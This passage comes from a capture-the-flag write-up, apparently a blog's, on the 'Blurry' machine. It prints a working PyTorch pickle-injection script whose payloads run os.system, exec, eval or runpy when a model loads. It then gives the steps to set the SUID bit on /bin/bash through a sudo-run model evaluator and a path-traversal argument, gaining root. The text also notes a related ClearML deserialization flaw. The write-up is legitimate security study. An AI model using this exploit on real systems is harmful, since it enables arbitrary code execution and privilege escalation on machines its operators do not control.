&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Inject the object(s) before the user-supplied data?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>first:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Pickle injected objects&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">for&lt;/span> inj_obj &lt;span style="color:#fe8019">in&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>inj_objs:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>save(inj_obj)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Pickle user-supplied data&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>save(obj)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Inject the object(s) after the user-supplied data?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">not&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>first:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Pickle injected objects&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">for&lt;/span> inj_obj &lt;span style="color:#fe8019">in&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>inj_objs:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>save(inj_obj)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>write(pickle&lt;span style="color:#fe8019">.&lt;/span>STOP)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>framer&lt;span style="color:#fe8019">.&lt;/span>end_framing()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">Pickler&lt;/span>(self, file, protocol):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Initialise the pickler interface with the injected object&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>_Pickler(file, protocol, self&lt;span style="color:#fe8019">.&lt;/span>inj_objs)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">class&lt;/span> _PickleInject():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Base class for pickling injected commands&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> __init__(self, args, command&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">None&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>command &lt;span style="color:#fe8019">=&lt;/span> command
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>args &lt;span style="color:#fe8019">=&lt;/span> args
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">__reduce__&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>command, (self&lt;span style="color:#fe8019">.&lt;/span>args,)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">class&lt;/span> System(_PickleInject):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Create os.system command&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> __init__(self, args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">super&lt;/span>()&lt;span style="color:#fe8019">.&lt;/span>__init__(args, command&lt;span style="color:#fe8019">=&lt;/span>os&lt;span style="color:#fe8019">.&lt;/span>system)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">class&lt;/span> Exec(_PickleInject):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Create exec command&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> __init__(self, args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">super&lt;/span>()&lt;span style="color:#fe8019">.&lt;/span>__init__(args, command&lt;span style="color:#fe8019">=&lt;/span>exec)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">class&lt;/span> Eval(_PickleInject):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Create eval command&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> __init__(self, args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">super&lt;/span>()&lt;span style="color:#fe8019">.&lt;/span>__init__(args, command&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fabd2f">eval&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">class&lt;/span> RunPy(_PickleInject):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Create runpy command&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> __init__(self, args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">import&lt;/span> runpy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">super&lt;/span>()&lt;span style="color:#fe8019">.&lt;/span>__init__(args, command&lt;span style="color:#fe8019">=&lt;/span>runpy&lt;span style="color:#fe8019">.&lt;/span>_run_code)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">__reduce__&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>command, (self&lt;span style="color:#fe8019">.&lt;/span>args,{})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>parser &lt;span style="color:#fe8019">=&lt;/span> argparse&lt;span style="color:#fe8019">.&lt;/span>ArgumentParser(description&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;PyTorch Pickle Inject&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>parser&lt;span style="color:#fe8019">.&lt;/span>add_argument(&lt;span style="color:#b8bb26">&amp;#34;model&amp;#34;&lt;/span>, &lt;span style="color:#fabd2f">type&lt;/span>&lt;span style="color:#fe8019">=&lt;/span>Path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>parser&lt;span style="color:#fe8019">.&lt;/span>add_argument(&lt;span style="color:#b8bb26">&amp;#34;command&amp;#34;&lt;/span>, choices&lt;span style="color:#fe8019">=&lt;/span>[&lt;span style="color:#b8bb26">&amp;#34;system&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;exec&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;eval&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;runpy&amp;#34;&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>parser&lt;span style="color:#fe8019">.&lt;/span>add_argument(&lt;span style="color:#b8bb26">&amp;#34;args&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>parser&lt;span style="color:#fe8019">.&lt;/span>add_argument(&lt;span style="color:#b8bb26">&amp;#34;-v&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;--verbose&amp;#34;&lt;/span>, help&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;verbose logging&amp;#34;&lt;/span>, action&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;count&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>args &lt;span style="color:#fe8019">=&lt;/span> parser&lt;span style="color:#fe8019">.&lt;/span>parse_args()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>command_args &lt;span style="color:#fe8019">=&lt;/span> args&lt;span style="color:#fe8019">.&lt;/span>args
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># If the command arg is a path, read the file contents&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> os&lt;span style="color:#fe8019">.&lt;/span>path&lt;span style="color:#fe8019">.&lt;/span>isfile(command_args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">with&lt;/span> &lt;span style="color:#fabd2f">open&lt;/span>(command_args, &lt;span style="color:#b8bb26">&amp;#34;r&amp;#34;&lt;/span>) &lt;span style="color:#fe8019">as&lt;/span> in_file:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command_args &lt;span style="color:#fe8019">=&lt;/span> in_file&lt;span style="color:#fe8019">.&lt;/span>read()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Construct payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> args&lt;span style="color:#fe8019">.&lt;/span>command &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;system&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#fe8019">=&lt;/span> PickleInject&lt;span style="color:#fe8019">.&lt;/span>System(command_args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">elif&lt;/span> args&lt;span style="color:#fe8019">.&lt;/span>command &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;exec&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#fe8019">=&lt;/span> PickleInject&lt;span style="color:#fe8019">.&lt;/span>Exec(command_args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">elif&lt;/span> args&lt;span style="color:#fe8019">.&lt;/span>command &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;eval&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#fe8019">=&lt;/span> PickleInject&lt;span style="color:#fe8019">.&lt;/span>Eval(command_args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">elif&lt;/span> args&lt;span style="color:#fe8019">.&lt;/span>command &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;runpy&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#fe8019">=&lt;/span> PickleInject&lt;span style="color:#fe8019">.&lt;/span>RunPy(command_args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Backup the model&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>backup_path &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">{}&lt;/span>&lt;span style="color:#b8bb26">.bak&amp;#34;&lt;/span>&lt;span style="color:#fe8019">.&lt;/span>format(args&lt;span style="color:#fe8019">.&lt;/span>model)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>shutil&lt;span style="color:#fe8019">.&lt;/span>copyfile(args&lt;span style="color:#fe8019">.&lt;/span>model, backup_path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Save the model with the injected payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>torch&lt;span style="color:#fe8019">.&lt;/span>save(torch&lt;span style="color:#fe8019">.&lt;/span>load(args&lt;span style="color:#fe8019">.&lt;/span>model), f&lt;span style="color:#fe8019">=&lt;/span>args&lt;span style="color:#fe8019">.&lt;/span>model, pickle_module&lt;span style="color:#fe8019">=&lt;/span>PickleInject([payload]))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Copy the code to the &lt;code>/tmp/&lt;/code> folder.
Now we have to make a copy of &lt;code>/models/demo_model.pth&lt;/code> file to &lt;code>/tmp&lt;/code> and use the script to inject code.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">cd&lt;/span> /tmp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cp /models/demo_model.pth .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python3 main.py ./demo_model.pth system &lt;span style="color:#b8bb26">&amp;#39;chmod u+s /bin/bash&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will modify the original model that now executes &lt;code>chmod u+s /bin/bash&lt;/code> and also create a backup of the original file.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013161804.webp">&lt;/figure>
&lt;p>Now we just have to move this updated model into &lt;code>/models/&lt;/code> and run it with &lt;code>/usr/bin/evaluate_model&lt;/code> command.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013162052.webp">&lt;/figure>
&lt;p>Since there&amp;rsquo;s an &lt;code>*&lt;/code> in the path, we don&amp;rsquo;t exactly need to move the updated model into the &lt;code>/models/&lt;/code> directory.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/bin/evaluate_model /models/../tmp/demo_model.pth
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013162253.webp">&lt;/figure>
&lt;p>And we are root.&lt;/p>
&lt;p>This machine mainly focuses on addressing security aspects essential for maintaining robust MLOps practices.
We explored the exploitation of a remote code execution vulnerability (CVE-2024-24590) in ClearML through malicious artifact uploads. By leveraging the insecure deserialization of pickle files, we demonstrated how an attacker could execute arbitrary code on a victim&amp;rsquo;s system. We also discussed the privilege escalation technique, using a crafted PyTorch model to gain root access.&lt;/p>
&lt;h4 id="references">References:&lt;/h4>
&lt;ul>
&lt;li>&lt;a href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/">Machine Learning Operations: What You Need to Know Now - HiddenLayer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.hackingarticles.in/python-serialization-vulnerabilities-pickle/">Python Serialization Vulnerabilities – Pickle&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://intoli.com/blog/dangerous-pickles/">Dangerous Pickles — Malicious Python Serialization&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hiddenlayer.com/research/weaponizing-machine-learning-models-with-ransomware/">Weaponizing ML Models with Ransomware&lt;/a>&lt;/li>
&lt;/ul></content></item></channel></rss>